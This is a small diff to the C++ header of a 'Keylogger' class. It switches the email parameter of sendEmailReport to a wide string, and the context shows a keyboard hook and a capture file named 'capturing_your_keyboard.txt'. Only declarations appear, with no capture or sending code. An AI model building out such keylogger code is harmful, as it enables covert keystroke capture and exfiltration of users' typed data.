@@ -20,7 +20,7 @@ public:
 	void stop();
 	~Keylogger();
 
-	bool sendEmailReport(std::string emailTo, bool deleteLocal);
+	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
 private:
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	shared_ptr<Hook> hook;
